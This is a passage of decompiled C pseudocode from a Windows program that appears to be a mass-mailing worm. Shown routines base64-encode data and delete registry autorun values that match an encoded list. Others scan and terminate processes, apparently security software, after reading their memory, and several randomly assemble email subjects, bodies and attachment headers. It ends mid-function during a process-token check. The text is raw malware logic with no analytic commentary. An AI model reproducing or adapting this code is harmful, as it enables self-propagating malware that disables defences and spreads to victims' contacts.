  char v25[3]; // [esp+1Ch] [ebp-4h] BYREF
  unsigned __int8 v26; // [esp+1Fh] [ebp-1h]

  v4 = 0;
  v5 = 0;
  v21 = 0;
  v24 = 0;
  v22 = a3;
  while ( v4 < a3 )
  {
    v23 = 3;
    if ( v22 < 3 )
      v23 = v22;
    qmemcpy(v25, "===", sizeof(v25));
    if ( v23 > 0 )
      qmemcpy(v25, (const void *)(a1 + v4), v23);
    v6 = v25[0];
    v26 = (unsigned __int8)v25[0] >> 2;
    if ( v5 )
    {
      v7 = a4;
      if ( a4 <= 0 )
      {
        v8 = a2;
      }
      else
      {
        v8 = a2;
        if ( !((v5 - v24) % a4) )
        {
          *(_BYTE *)(v5 + a2) = 13;
          v9 = v5 + 1;
          *(_BYTE *)(v9 + a2) = 10;
          v5 = v9 + 1;
          v24 += 2;
        }
      }
    }
    else
    {
      v8 = a2;
      v7 = a4;
    }
    *(_BYTE *)(v5 + v8) = *((_BYTE *)off_40E030 + v26);
    v10 = v25[1];
    v11 = v5 + 1;
    v12 = ((unsigned __int8)v25[1] >> 4) + 16 * (v6 & 3);
    if ( v11 && v7 > 0 )
    {
      if ( !((v11 - v24) % v7) )
      {
        *(_BYTE *)(v11 + v8) = 13;
        v13 = v11 + 1;
        *(_BYTE *)(v13 + v8) = 10;
        v11 = v13 + 1;
        v24 += 2;
      }
      v10 = v25[1];
    }
    *(_BYTE *)(v11 + v8) = *((_BYTE *)off_40E030 + v12);
    v14 = v25[2];
    v15 = v11 + 1;
    v26 = ((unsigned __int8)v25[2] >> 6) + 4 * (v10 & 0xF);
    if ( v15 && v7 > 0 && !((v15 - v24) % v7) )
    {
      *(_BYTE *)(v15 + v8) = 13;
      v16 = v15 + 1;
      *(_BYTE *)(v16 + v8) = 10;
      v15 = v16 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v15 + v8) = *((_BYTE *)off_40E030 + v26);
    v17 = v15 + 1;
    if ( v23 <= 2 )
      *(_BYTE *)(v17 + v8 - 1) = 61;
    v18 = v14 & 0x3F;
    if ( v17 && v7 > 0 && !((v17 - v24) % v7) )
    {
      *(_BYTE *)(v17 + v8) = 13;
      v19 = v17 + 1;
      *(_BYTE *)(v19 + v8) = 10;
      v17 = v19 + 1;
      v24 += 2;
    }
    *(_BYTE *)(v17 + v8) = *((_BYTE *)off_40E030 + v18);
    v5 = v17 + 1;
    if ( v23 <= 1 )
      *(_BYTE *)(v5 + v8 - 1) = 61;
    v4 = v21 + 3;
    v22 -= 3;
    v21 += 3;
  }
  return v5;
}
// 40E030: using guessed type void *off_40E030;

//----- (00401198) --------------------------------------------------------
LSTATUS sub_401198()
{
  char *v0; // eax
  LSTATUS result; // eax
  int i; // edi
  char *v3; // eax
  HMODULE LibraryA; // esi
  char *v5; // eax
  FARPROC ProcAddress; // eax
  CHAR Name[260]; // [esp+0h] [ebp-110h] BYREF
  int v8; // [esp+104h] [ebp-Ch]
  DWORD dwIndex; // [esp+108h] [ebp-8h]
  HKEY phkResult; // [esp+10Ch] [ebp-4h] BYREF

  dwIndex = 0;
  v0 = sub_403434(SubKey, 4);
  result = RegOpenKeyA(HKEY_LOCAL_MACHINE, v0, &phkResult);
  if ( !result )
  {
    v8 = sub_403464(aJvxt, 0);
    while ( !RegEnumKeyA(phkResult, dwIndex, Name, 0x104u) )
    {
      _strupr(Name);
      for ( i = 0; i < v8; ++i )
      {
        v3 = sub_403434(aJvxt, i);
        if ( sub_403B7D(Name, v3) )
        {
          LibraryA = LoadLibraryA(LibFileName);
          if ( LibraryA )
          {
            v5 = sub_403434(ProcName, 2);
            ProcAddress = GetProcAddress(LibraryA, v5);
            if ( ProcAddress )
              ((void (__stdcall *)(HKEY, CHAR *))ProcAddress)(phkResult, Name);
            FreeLibrary(LibraryA);
          }
        }
      }
      ++dwIndex;
    }
    return RegCloseKey(phkResult);
  }
  return result;
}

//----- (00401284) --------------------------------------------------------
int __stdcall sub_401284(HKEY hKey, LPCSTR lpSubKey)
{
  int v3; // ebx
  BYTE Data[1024]; // [esp+4h] [ebp-814h] BYREF
  CHAR ValueName[1024]; // [esp+404h] [ebp-414h] BYREF
  char *v6; // [esp+804h] [ebp-14h]
  DWORD Type; // [esp+808h] [ebp-10h] BYREF
  DWORD cchValueName; // [esp+80Ch] [ebp-Ch] BYREF
  DWORD cbData; // [esp+810h] [ebp-8h] BYREF
  DWORD dwIndex; // [esp+814h] [ebp-4h]
  HKEY hKeya; // [esp+820h] [ebp+8h]

  dwIndex = 0;
  cchValueName = 1024;
  cbData = 1024;
  if ( RegOpenKeyA(hKey, lpSubKey, (PHKEY)&lpSubKey) )
    return 0;
  hKeya = (HKEY)sub_403464(aJvxt, 0);
  while ( 1 )
  {
    v3 = 0;
    cchValueName = 1024;
    cbData = 1024;
    if ( RegEnumValueA((HKEY)lpSubKey, dwIndex, ValueName, &cchValueName, 0, &Type, Data, &cbData) )
      break;
    if ( Type != 1 )
      Data[0] = 0;
    _strupr(ValueName);
    _strupr((char *)Data);
    if ( (int)hKeya > 0 )
    {
      do
      {
        v6 = sub_403434(aJvxt, v3);
        if ( sub_403B7D(ValueName, v6) || sub_403B7D((char *)Data, v6) || !strcmp(ValueName, Str2) )
          RegDeleteValueA((HKEY)lpSubKey, ValueName);
        ++v3;
      }
      while ( v3 < (int)hKeya );
    }
    ++dwIndex;
  }
  RegCloseKey((HKEY)lpSubKey);
  return 0;
}

//----- (004013A9) --------------------------------------------------------
int sub_4013A9()
{
  char Destination[512]; // [esp+4h] [ebp-200h] BYREF

  sub_401198();
  sub_403BD8(Destination, 2);
  sub_401284(HKEY_LOCAL_MACHINE, Destination);
  sub_403BD8(Destination, 6);
  return sub_401284(HKEY_LOCAL_MACHINE, Destination);
}

//----- (004013FA) --------------------------------------------------------
int __stdcall sub_4013FA(DWORD th32ProcessID, int a2)
{
  int v2; // ebx
  DWORD modBaseSize; // eax
  size_t v4; // eax
  int v5; // esi
  size_t v6; // ebx
  SIZE_T v7; // eax
  char *v8; // eax
  CHAR Filename[260]; // [esp+8h] [ebp-444h] BYREF
  MODULEENTRY32 me; // [esp+10Ch] [ebp-340h] BYREF
  char Destination[260]; // [esp+330h] [ebp-11Ch] BYREF
  HANDLE hObject; // [esp+434h] [ebp-18h]
  size_t MaxCount; // [esp+438h] [ebp-14h]
  char *String1; // [esp+43Ch] [ebp-10h]
  HANDLE hProcess; // [esp+440h] [ebp-Ch]
  SIZE_T NumberOfBytesRead; // [esp+444h] [ebp-8h] BYREF
  unsigned int v18; // [esp+448h] [ebp-4h]
  unsigned int th32ProcessIDa; // [esp+454h] [ebp+8h]

  v2 = 0;
  MaxCount = strlen(&::String1);
  sub_4052D3(0, Name);
  v18 = sub_403464(aR_2, 0);
  GetModuleFileNameA(0, Filename, 0x104u);
  me.dwSize = 548;
  hObject = CreateToolhelp32Snapshot(8u, th32ProcessID);
  if ( Module32First(hObject, &me) )
  {
    strcpy(Destination, me.szExePath);
    if ( _strcmpi(Filename, Destination) )
    {
      hProcess = OpenProcess(0x1F0FFFu, 0, me.th32ProcessID);
      if ( hProcess )
      {
        memset(byte_411970, 0, sizeof(byte_411970));
        modBaseSize = me.modBaseSize;
        if ( me.modBaseSize >= 0x80000 )
          modBaseSize = 0x80000;
        NumberOfBytesRead = 0;
        if ( a2 || ReadProcessMemory(hProcess, me.modBaseAddr, byte_411970, modBaseSize, &NumberOfBytesRead) )
        {
          for ( th32ProcessIDa = 0; th32ProcessIDa < v18; ++th32ProcessIDa )
          {
            String1 = sub_403434(aR_2, th32ProcessIDa);
            v4 = strlen(String1);
            v5 = 0;
            v6 = v4;
            if ( a2 )
            {
              v7 = v4 + 110;
              NumberOfBytesRead = v6 + 110;
            }
            else
            {
              v7 = NumberOfBytesRead;
            }
            if ( v7 - v6 != 10 )
            {
              while ( _strnicmp(&::String1, &byte_411970[v5], MaxCount) )
              {
                if ( a2 || !_strnicmp(String1, &byte_411970[v5], v6) )
                {
                  TerminateProcess(hProcess, 0);
                  Sleep(0x32u);
                  v8 = sub_403434(asc_40FDCC, 1);
                  if ( !sub_403B7D(Destination, v8) )
                    sub_403DFA(Destination);
                  break;
                }
                if ( ++v5 >= NumberOfBytesRead - v6 - 10 )
                  goto LABEL_21;
              }
              th32ProcessIDa = v18 + 1;
            }
LABEL_21:
            ;
          }
        }
        CloseHandle(hProcess);
        v2 = 1;
      }
    }
  }
  CloseHandle(hObject);
  return v2;
}

//----- (004015FF) --------------------------------------------------------
void __stdcall __noreturn sub_4015FF(LPVOID lpThreadParameter)
{
  int v1; // esi
  BOOL i; // eax
  int v3; // edi
  int v4; // esi
  char *v5; // eax
  char Filename[260]; // [esp+Ch] [ebp-238h] BYREF
  PROCESSENTRY32 pe; // [esp+110h] [ebp-134h] BYREF
  HANDLE hSnapshot; // [esp+238h] [ebp-Ch]
  int v9; // [esp+23Ch] [ebp-8h]
  int v10; // [esp+240h] [ebp-4h]

  v1 = 95;
  v10 = sub_403464(aJvxt, 0);
  while ( 1 )
  {
    v9 = (v1 + 1) % 100;
    if ( !(v9 % 10) )
      sub_4013A9();
    pe.dwSize = 296;
    hSnapshot = CreateToolhelp32Snapshot(2u, 0);
    for ( i = Process32First(hSnapshot, &pe); i; i = Process32Next(hSnapshot, &pe) )
    {
      _splitpath(pe.szExeFile, 0, 0, Filename, 0);
      _strupr(Filename);
      if ( !v9 )
        sub_4013FA(pe.th32ProcessID, 0);
      v3 = 0;
      v4 = 0;
      if ( v10 <= 0 )
        goto LABEL_15;
      do
      {
        v5 = sub_403434(aJvxt, v4);
        if ( !_strcmpi(Filename, v5) && (v4 != v10 - 1 || dword_491E98) )
        {
          v3 = 1;
          sub_4013FA(pe.th32ProcessID, 1);
          dword_40FF80 = 1;
        }
        ++v4;
      }
      while ( v4 < v10 );
      if ( !v3 )
LABEL_15:
        dword_40FF80 = 0;
    }
    CloseHandle(hSnapshot);
    if ( dword_491E88 )
      sub_40451C(HKEY_LOCAL_MACHINE, Destination, ServiceName, &ApplicationName);
    Sleep(0x64u);
    v1 = v9;
  }
}
// 40FF80: using guessed type int dword_40FF80;
// 491E88: using guessed type int dword_491E88;
// 491E98: using guessed type int dword_491E98;

//----- (0040174B) --------------------------------------------------------
void *__thiscall sub_40174B(void *this)
{
  return this;
}

//----- (0040174E) --------------------------------------------------------
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int a3, int a4)
{
  DWORD v5; // eax
  DWORD v6; // ebx
  HANDLE FileA; // eax
  DWORD FileSize; // eax
  bool v9; // zf
  HANDLE FileMappingA; // eax
  LPVOID result; // eax
  DWORD dwDesiredAccess; // [esp+Ch] [ebp-8h]
  DWORD FileSizeHigh; // [esp+10h] [ebp-4h] BYREF

  v5 = 0x80000000;
  v6 = 2;
  dwDesiredAccess = 4;
  FileSizeHigh = 0;
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  if ( !a4 )
  {
    v5 = -1073741824;
    v6 = 4;
    dwDesiredAccess = 2;
  }
  if ( lpFileName )
  {
    FileA = CreateFileA(lpFileName, v5, 1u, 0, 3u, 0x20u, 0);
    *(_DWORD *)this = FileA;
    if ( FileA == (HANDLE)-1 )
      return 0;
    FileSize = GetFileSize(FileA, &FileSizeHigh);
    v9 = FileSizeHigh == 0;
    *(_DWORD *)(this + 12) = FileSize;
    if ( !v9 )
    {
LABEL_9:
      CloseHandle(*(HANDLE *)this);
      return 0;
    }
    if ( a3 )
      *(_DWORD *)a3 = FileSize;
  }
  FileMappingA = CreateFileMappingA(*(HANDLE *)this, 0, v6, 0, 0, 0);
  *(_DWORD *)(this + 4) = FileMappingA;
  if ( !FileMappingA )
    goto LABEL_9;
  result = MapViewOfFile(FileMappingA, dwDesiredAccess, 0, 0, 0);
  *(_DWORD *)(this + 8) = result;
  if ( result )
    return result;
  CloseHandle(*(HANDLE *)(this + 4));
  CloseHandle(*(HANDLE *)this);
  return 0;
}

//----- (00401808) --------------------------------------------------------
HANDLE __thiscall sub_401808(int this)
{
  HANDLE result; // eax

  if ( *(_DWORD *)(this + 8) )
    UnmapViewOfFile(*(LPCVOID *)(this + 8));
  if ( *(_DWORD *)(this + 4) )
    CloseHandle(*(HANDLE *)(this + 4));
  result = *(HANDLE *)this;
  if ( *(_DWORD *)this )
    result = (HANDLE)CloseHandle(*(HANDLE *)this);
  *(_DWORD *)this = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  return result;
}

//----- (00401841) --------------------------------------------------------
char *__cdecl sub_401841(char *Destination)
{
  char *result; // eax
  bool v2; // zf
  char *v3; // eax

  *((_DWORD *)Destination + 583) = sub_404687(0) & 1;
  sub_403624(Destination + 2232, 10, 38, 7);
  if ( FullPath )
    strcpy(Destination + 1972, &FullPath);
  sub_401A1E(Destination);
  result = (char *)toupper(Destination[300]);
  v2 = Destination[428] == 0;
  Destination[300] = (char)result;
  if ( v2 )
    *((_DWORD *)Destination + 583) = 1;
  if ( !Destination[1712] )
  {
    v3 = sub_403434(&byte_40F1DC, *((_DWORD *)Destination + 584));
    return sub_404156(Destination + 1712, 0, v3, 1);
  }
  return result;
}

//----- (004018E9) --------------------------------------------------------
int __cdecl sub_4018E9(int a1)
{
  int v1; // ebx
  int *v2; // edi
  signed __int16 v3; // cx
  char *v4; // ebx
  int v5; // esi
  char *v6; // edi
  char *v7; // eax
  unsigned int v8; // eax
  char *v9; // eax
  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-1Ch] BYREF
  int v12; // [esp+1Ch] [ebp-Ch]
  int v13; // [esp+20h] [ebp-8h]
  int v14; // [esp+24h] [ebp-4h] BYREF

  GetLocalTime(&SystemTime);
  v1 = 0;
  v12 = sub_403464(aR_3, 0);
  if ( v12 <= 0 )
    return 0;
  v2 = (int *)&unk_40D210;
  do
  {
    v14 = *v2;
    v13 = v14;
    sub_404A28((__int16 *)&v14, -((int)v2 >= (int)&unk_40D220 ? 5 : 15));
    v3 = v13;
    if ( (__int16)v14 > (__int16)v13 )
    {
      v3 = v13 + 12;
      HIWORD(v13) += 30;
    }
    if ( (__int16)v14 <= (int)SystemTime.wMonth
      && SystemTime.wMonth <= v3
      && SHIWORD(v14) <= (int)SystemTime.wDay
      && SystemTime.wDay <= SHIWORD(v13) + 2 )
    {
      break;
    }
    ++v1;
    ++v2;
  }
  while ( v1 < v12 );
  if ( v1 >= v12 )
    return 0;
  v4 = sub_403434(aR_3, v1);
  v5 = sub_404687(0) & 1;
  v6 = (char *)(a1 + 300);
  v7 = sub_403434(aD_0, v5);
  strcpy((char *)(a1 + 300), v7);
  if ( !(sub_404687(0) % 3u) || v5 )
  {
    v8 = sub_404687(0);
    v9 = sub_403434(asc_40F396, v8 % 6);
    strcat(v6, v9);
    strcat(v6, asc_40E038);
  }
  strcat(v6, v4);
  return 1;
}

//----- (00401A1E) --------------------------------------------------------
char *__cdecl sub_401A1E(char *Destination)
{
  unsigned int v2; // edi
  char *result; // eax
  unsigned int v4; // eax
  char *v5; // edi
  char v6; // al
  char *v7; // eax
  unsigned int v8; // eax
  char v9; // al
  char *v10; // eax
  char v11; // al
  char *v12; // eax
  int v13; // edi
  char v14; // al
  char *v15; // ebx
  char *v16; // eax
  char *v17; // eax
  char *v18; // [esp-4h] [ebp-C18h]
  char *v19; // [esp-4h] [ebp-C18h]
  char v20[1024]; // [esp+Ch] [ebp-C08h] BYREF
  char v21[1024]; // [esp+40Ch] [ebp-808h] BYREF
  char Source[1024]; // [esp+80Ch] [ebp-408h] BYREF
  char *v23; // [esp+C0Ch] [ebp-8h]
  char *v24; // [esp+C10h] [ebp-4h]
  char *Destinationa; // [esp+C1Ch] [ebp+8h]

  v24 = 0;
  v20[0] = 0;
  sub_403AAD((int)(Destination + 100), (int)v20, v21);
  v23 = Destination + 428;
  Destination[428] = 0;
  v20[100] = 0;
  Source[0] = 0;
  Destinationa = Destination + 300;
  *Destinationa = 0;
  Destination[1712] = 0;
  v2 = sub_403464(&byte_40F1DC, 0);
  *((_DWORD *)Destination + 584) = sub_404687(0) % v2;
  if ( !(sub_404687(0) % 3u) )
  {
    result = (char *)sub_4018E9((int)Destination);
    if ( result )
      return result;
  }
  if ( (sub_404687(0) & 0xF) == 0 )
  {
    v24 = (char *)1;
LABEL_5:
    if ( !(sub_404687(0) % 3u) || v24 )
    {
      v13 = sub_404687(0) % 5u;
      if ( v24 )
        v13 = 0;
      v24 = (char *)dword_40D1E8[v13];
      v23 = (char *)dword_40D1FC[v13];
      v24 += sub_404687(0) % (unsigned int)v23;
      if ( v13 >= 4 )
      {
        v19 = sub_403434(asc_40F396, (int)v24);
        v17 = sub_403434(&byte_40F346, v13);
        sprintf(Source, v17, v19);
      }
      else
      {
        if ( (sub_404687(0) & 1) != 0 || v13 == 3 )
        {
          v15 = byte_411940;
        }
        else
        {
          v14 = sub_404687(0);
          v15 = sub_403434(Format, (v14 & 1) + 8);
        }
        v18 = sub_403434(asc_40F396, (int)v24);
        v16 = sub_403434(&byte_40F346, v13);
        sprintf(Source, v16, v15, v18);
      }
      strcpy(Destinationa, Source);
      return sub_401DC4((int)Destination, v13, v24);
    }
    else
    {
      v23 = (char *)sub_403464(&byte_40F3E2, 0);
      v4 = sub_404687(0);
      v5 = sub_403434(&byte_40F3E2, v4 % (unsigned int)v23);
      if ( sub_404687(0) % 3u )
      {
        return strcpy(Destinationa, v5);
      }
      else if ( sub_404687(0) % 6u )
      {
        v11 = sub_404687(0);
        v12 = sub_403434(aD_1, v11 & 3);
        strcpy(Destinationa, v12);
        if ( (sub_404687(0) & 1) != 0 )
        {
          strcat(Destinationa, v20);
          strcat(Destinationa, asc_40E03C);
        }
        *v5 = tolower(*v5);
        return strcat(Destinationa, v5);
      }
      else
      {
        v6 = sub_404687(0);
        v7 = sub_403434(aD_1, (v6 & 1) + 4);
        sprintf(Destinationa, v7, v5);
        return sub_4021CE((int)Destination, v5);
      }
    }
  }
  if ( (sub_404687(0) & 0x1F) == 0 )
    return strcpy(Destinationa, asc_40E038);
  if ( (sub_404687(0) & 1) != 0 || !FileName[0] || !sub_403944(FileName, Source, 5, 50, 1) )
    goto LABEL_5;
  *((_DWORD *)Destination + 583) = 1;
  v8 = sub_404687(0);
  v21[0] = 0;
  if ( v8 % 6 )
  {
    strcpy(Destinationa, Source);
    result = (char *)sub_404687(0);
    if ( ((unsigned __int8)result & 0x1F) == 0 )
    {
      v21[0] = 0;
      sub_403944(FileName, v21, 5, 800, 1);
      return strcpy(v23, v21);
    }
  }
  else
  {
    v9 = sub_404687(0);
    v10 = sub_403434(aD_1, (v9 & 1) + 4);
    sprintf(Destinationa, v10, Source);
    return sub_4021CE((int)Destination, Source);
  }
  return result;
}
// 40D1E8: using guessed type int dword_40D1E8[4];
// 40D1FC: using guessed type int dword_40D1FC[5];

//----- (00401DC4) --------------------------------------------------------
char *__cdecl sub_401DC4(int a1, int a2, char *Destination)
{
  char v3; // al
  char *v4; // edi
  char *v5; // eax
  char v6; // al
  unsigned int v7; // eax
  char *v8; // eax
  char v9; // al
  char *v10; // eax
  char *v11; // eax
  unsigned int v12; // eax
  char *v13; // eax
  unsigned int v15; // edi
  unsigned int v16; // eax
  char v17; // al
  char *v18; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char v27; // al
  char *v28; // eax
  char *v29; // [esp-8h] [ebp-274h]
  char *v30; // [esp-4h] [ebp-270h]
  char *v31; // [esp-4h] [ebp-270h]
  char *v32; // [esp-4h] [ebp-270h]
  char v33[200]; // [esp+Ch] [ebp-260h] BYREF
  char Source[200]; // [esp+D4h] [ebp-198h] BYREF
  char Buffer[200]; // [esp+19Ch] [ebp-D0h] BYREF
  char *v36; // [esp+264h] [ebp-8h]
  unsigned int v37; // [esp+268h] [ebp-4h]
  char *v38; // [esp+278h] [ebp+Ch]
  char *Destinationa; // [esp+27Ch] [ebp+10h]
  const char *Destinationb; // [esp+27Ch] [ebp+10h]

  if ( a2 == 4 )
  {
    LOBYTE(v37) = sub_404687(0) & 1;
    v37 = (unsigned __int8)v37;
    *(_DWORD *)(a1 + 2332) = 0;
    *(_DWORD *)(a1 + 2336) = 0;
    v15 = sub_403464(aR_4, 0);
    v16 = sub_404687(0);
    v36 = sub_403434(aR_4, v16 % v15);
    strcpy(Source, v36);
    if ( (sub_404687(0) & 1) != 0 )
    {
      v38 = byte_411940;
    }
    else
    {
      v17 = sub_404687(0);
      v38 = sub_403434(Format, (v17 & 1) + 8);
    }
    v18 = sub_403434(Format, 4);
    sprintf(Buffer, v18, v38);
    strcat(Source, Buffer);
    Destinationb = sub_403434(asc_40F396, (int)Destination);
    v20 = sub_403434(&byte_40F346, 4);
    sprintf(Buffer, v20, Destinationb);
    strcat(Source, Buffer);
    strcpy(Buffer, Destinationb);
    v32 = sub_403434(Format, (int)(Destination - 3));
    v21 = sub_403434(Format, 5);
    sprintf(v33, v21, v38, v32);
    strcat(Buffer, v33);
    if ( v37 )
    {
      strcpy((char *)(a1 + 428), Source);
      strcat((char *)(a1 + 428), &byte_40F752);
      v22 = Buffer;
    }
    else
    {
      strcpy((char *)(a1 + 428), Buffer);
      strcat((char *)(a1 + 428), &byte_40F752);
      v22 = Source;
    }
    strcat((char *)(a1 + 428), v22);
    strcat((char *)(a1 + 428), &byte_40F752);
    strcat((char *)(a1 + 428), &byte_40F752);
    v23 = sub_403434(Format, 13);
    strcat((char *)(a1 + 428), v23);
    v24 = sub_403434(Format, 10);
    strcat((char *)(a1 + 428), v24);
    v25 = sub_403434(Format, 11);
    strcat((char *)(a1 + 428), v25);
    strcat((char *)(a1 + 428), v36);
    v26 = sub_403434(Format, 12);
    strcat((char *)(a1 + 428), v26);
    *(_DWORD *)(a1 + 2332) = 0;
    v27 = sub_404687(0);
    v28 = sub_403434(a2_0, v27 & 1);
    strcpy((char *)(a1 + 1712), v28);
    return strcat((char *)(a1 + 1712), &byte_40F1DC);
  }
  else
  {
    if ( (sub_404687(0) & 1) != 0 || a2 == 3 )
    {
      v4 = byte_411940;
    }
    else
    {
      v3 = sub_404687(0);
      v4 = sub_403434(Format, (v3 & 1) + 8);
    }
    v30 = sub_403434(asc_40F396, (int)Destination);
    v5 = sub_403434(&byte_40F346, a2);
    sprintf(Source, v5, v4, v30);
    v6 = sub_404687(0);
    v31 = sub_403434(Format, (v6 & 1) + 16);
    v7 = sub_404687(0);
    v29 = sub_403434(Format, v7 % 3 + 18);
    v8 = sub_403434(Format, 15);
    sprintf(Buffer, v8, v29, v31);
    if ( (sub_404687(0) & 1) == 0 )
    {
      v9 = sub_404687(0);
      v10 = sub_403434(aD_1, v9 & 1);
      strcpy((char *)(a1 + 428), v10);
    }
    Destinationa = (char *)(a1 + 428);
    v11 = sub_403434(Format, 14);
    strcat((char *)(a1 + 428), v11);
    strcat((char *)(a1 + 428), Source);
    if ( !a2 )
    {
      strcat(Destinationa, &byte_40F752);
      strcat(Destinationa, asc_40F90F);
      *(_DWORD *)(a1 + 2332) = 0;
      *(_DWORD *)(a1 + 2336) = 0;
      v37 = sub_403464(a2_0, 0);
      v12 = sub_404687(0);
      v13 = sub_403434(a2_0, v12 % v37);
      strcpy((char *)(a1 + 1712), v13);
      strcat((char *)(a1 + 1712), &byte_40F1DC);
    }
    strcat(Destinationa, &byte_40F752);
    return strcat(Destinationa, Buffer);
  }
}

//----- (004021CE) --------------------------------------------------------
char *__cdecl sub_4021CE(int a1, char *Source)
{
  char *v2; // eax
  char *v3; // eax
  char v4; // al
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char *result; // eax
  char Destination[100]; // [esp+10h] [ebp-64h] BYREF

  sprintf((char *const)(a1 + 428), Format, a1 + 200);
  strcat((char *)(a1 + 428), &byte_40F752);
  strcat((char *)(a1 + 428), &byte_40F752);
  strcat((char *)(a1 + 428), aX0);
  strcat((char *)(a1 + 428), (const char *)(a1 + 100));
  strcat((char *)(a1 + 428), &byte_40F752);
  v2 = sub_403434(aX0, 1);
  strcat((char *)(a1 + 428), v2);
  strcat((char *)(a1 + 428), (const char *)(a1 + 200));
  strcat((char *)(a1 + 428), &byte_40F752);
  v3 = sub_403434(aX0, 2);
  strcat((char *)(a1 + 428), v3);
  strcat((char *)(a1 + 428), Source);
  strcat((char *)(a1 + 428), &byte_40F752);
  v4 = sub_404687(0);
  v5 = sub_403434(Format, (v4 & 1) + 1);
  strcat((char *)(a1 + 428), v5);
  v6 = sub_403434(Format, 3);
  strcat((char *)(a1 + 428), v6);
  sub_403AAD(a1 + 100, 0, Destination);
  v7 = sub_403434(aIao42, 1);
  strcpy((char *)(a1 + 200), v7);
  result = strcat((char *)(a1 + 200), Destination);
  *(_DWORD *)(a1 + 2332) = 0;
  return result;
}

//----- (004022DB) --------------------------------------------------------
char *__cdecl sub_4022DB(char *a1, char *Destination)
{
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  const char *v8; // eax
  const CHAR *v9; // ebx
  unsigned int v10; // eax
  char *v11; // eax
  char Source[1024]; // [esp+Ch] [ebp-868h] BYREF
  char Ext[1024]; // [esp+40Ch] [ebp-468h] BYREF
  char v15[100]; // [esp+80Ch] [ebp-68h] BYREF
  int v16; // [esp+870h] [ebp-4h] BYREF
  int v17; // [esp+87Ch] [ebp+8h]
  char *v18; // [esp+87Ch] [ebp+8h]
  char *v19; // [esp+87Ch] [ebp+8h]
  char *Destinationa; // [esp+880h] [ebp+Ch]

  strcpy(Destination, aX0);
  sub_403AAD((int)(a1 + 200), (int)Ext, Source);
  sprintf(Source, aZ2, Ext, a1 + 200);
  strcat(Destination, Source);
  strcat(Destination, aIao42);
  v4 = sub_403434(aX0, 1);
  strcat(Destination, v4);
  strcat(Destination, a1 + 100);
  strcat(Destination, aIao42);
  v5 = sub_403434(aX0, 2);
  strcat(Destination, v5);
  strcat(Destination, a1 + 300);
  strcat(Destination, aIao42);
  strcat(Destination, aNfnZx);
  Destinationa = a1 + 2232;
  strcat(Destination, a1 + 2232);
  strcat(Destination, aIao42);
  strcat(Destination, aIao42);
  sub_403624(v15, 8, 20, 7);
  sub_40260D(Destination, a1 + 2232, 1);
  v6 = aIao42;
  if ( *((_DWORD *)a1 + 583) )
  {
    sprintf(Source, aIa, v15);
    v6 = Source;
  }
  sprintf(Ext, aR_0, v6);
  strcat(Destination, Ext);
  strcat(Destination, a1 + 428);
  strcat(Destination, &byte_40F82B);
  strcat(Destination, aIao42);
  strcat(Destination, aIao42);
  v17 = sub_404687(0) & 1;
  if ( !*((_DWORD *)a1 + 583) )
    v17 = 2;
  sub_40260D(Destination, Destinationa, 1);
  v7 = sub_403434(&byte_40F89D, v17);
  sprintf(Ext, aR_1, v7, a1 + 1712, v15);
  strcat(Destination, Ext);
  strcat(Destination, aIao42);
  strcat(Destination, aIao42);
  v8 = (const char *)sub_4040BD(a1 + 1452, (int)&v16, 1);
  v18 = (char *)v8;
  if ( v8 )
  {
    strcat(Destination, v8);
    operator delete(v18);
  }
  strcat(Destination, aIao42);
  v9 = a1 + 1972;
  if ( *v9 )
  {
    v10 = sub_403D0B(v9);
    v16 = v10;
    if ( v10 < 0xC800 || v10 < 0x7D000 && (sub_404687(0) & 1) != 0 )
    {
      v19 = (char *)sub_4040BD(v9, (int)&v16, 0);
      if ( v19 )
      {
        sub_40260D(Destination, Destinationa, 1);
        sub_40260D(Destination, Destinationa, 1);
        _splitpath(v9, 0, 0, Source, Ext);
        strcat(Source, Ext);
        v11 = sub_403434(&byte_40F89D, 2);
        sprintf(Ext, aR_1, v11, Source, v15);
        strcat(Destination, Ext);
        strcat(Destination, aIao42);
        strcat(Destination, aIao42);
        strcat(Destination, v19);
        strcat(Destination, aIao42);
        operator delete(v19);
      }
    }
  }
  sub_40260D(Destination, Destinationa, 0);
  return strcat(Destination, asc_40E040);
}

//----- (0040260D) --------------------------------------------------------
char *__cdecl sub_40260D(char *Destination, char *Source, int a3)
{
  char *result; // eax

  strcat(Destination, asc_40E040);
  result = strcat(Destination, Source);
  if ( a3 )
    return strcat(Destination, aIao42);
  return result;
}

//----- (00402642) --------------------------------------------------------
DWORD __cdecl sub_402642(_DWORD *a1)
{
  DWORD CurrentProcessId; // eax
  DWORD LastError; // eax
  HLOCAL v4; // eax
  HLOCAL v5; // eax
  PSID *v6; // esi
  PSID pSid1; // [esp+Ch] [ebp-30h]
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+14h] [ebp-28h] BYREF
  HANDLE hObject; // [esp+1Ch] [ebp-20h]
  int v11; // [esp+20h] [ebp-1Ch]
  PSID pSid; // [esp+24h] [ebp-18h] BYREF
  PSID pSid2; // [esp+28h] [ebp-14h] BYREF
  HANDLE TokenHandle; // [esp+2Ch] [ebp-10h] BYREF
  SIZE_T uBytes; // [esp+30h] [ebp-Ch] BYREF
  HLOCAL hMem; // [esp+34h] [ebp-8h]
  DWORD v17; // [esp+38h] [ebp-4h]
  unsigned int v18; // [esp+44h] [ebp+8h]

  CurrentProcessId = GetCurrentProcessId();
  TokenHandle = 0;
  uBytes = 50;
  hMem = 0;
  pIdentifierAuthority.Value[0] = 0;
  pIdentifierAuthority.Value[1] = 0;
  pIdentifierAuthority.Value[2] = 0;
  pIdentifierAuthority.Value[3] = 0;
  pIdentifierAuthority.Value[4] = 0;
  pIdentifierAuthority.Value[5] = 5;
  pSid = 0;
  pSid2 = 0;
  v17 = 0;
  v11 = 0;
  *a1 = 0;
  hObject = OpenProcess(0x1F0FFFu, 0, CurrentProcessId);
